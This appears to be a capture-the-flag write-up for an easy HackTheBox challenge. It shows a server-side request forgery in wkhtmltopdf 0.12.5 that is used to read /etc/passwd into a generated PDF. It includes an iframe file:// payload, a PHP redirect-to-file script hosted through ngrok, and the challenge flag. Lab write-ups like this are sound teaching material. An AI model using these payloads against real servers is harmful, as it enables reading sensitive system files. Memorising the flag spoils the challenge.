---
layout: writeup
category: HackTheBox
chall_description: 
points: 
solves: 
tags: HTB, easy
date: 2024-07-10
comments: false
---


## Description
This was a nice and easy challenge. We had to perform server site reqest forgery to get cotents of `/etc/passwd` in the PDF generate by the server.    


## Enumeration

We are given the IP and port where the site is hosted. Site takes a URL and genarates a PDF for it.
![Branching](/assets/CTFs/HackTheBox/challenges/pdfy1.png)  

Sending a random url to check its working we can see it generates a PDF using `wkhtmltopdf` version `0.12.5`. This version is however vulnerable to SSRF. [Exploit-DB](https://www.exploit-db.com/exploits/51039)
![Branching](/assets/CTFs/HackTheBox/challenges/pdfy2.png)    


## Exploitation

We have to use frame tag to load local file. In Python, I hosted a basic html file with `<iframe src=”file:///etc/passwd” height=”500” width=”500”></iframe>` and used ngrok to host my local server in the Internet. However this did not work for, for some reason iframe gave error and PDF wasn't generated.  
After some research I found out this CTF writeup which had a similar situation [Insomni'hack 2019 - Ezgen](https://gist.github.com/ast3ro/ca6eec74293be5992f35b18023b420a4). There he used php's location function to redirect to `file:///etc/passwd`.  

Final explaoit, local hosting using php and remote hosting using ngrok. Contents of index.php are as follows.
```php
<?php 
echo "Testing: ";
if (isset($_GET['r'])) {
    header("Location:file:///etc/passwd");
    
} else {
    echo "Not Redirected.";
}
?>
```  

In the URL input we send `*.ngrok-free.app/?r=1` and we get the contents of the file.
![Branching](/assets/CTFs/HackTheBox/challenges/pdfy3.png)  

Flag: `HTB{pdF_g3n3r4t1on_g03s_brrr!}`  










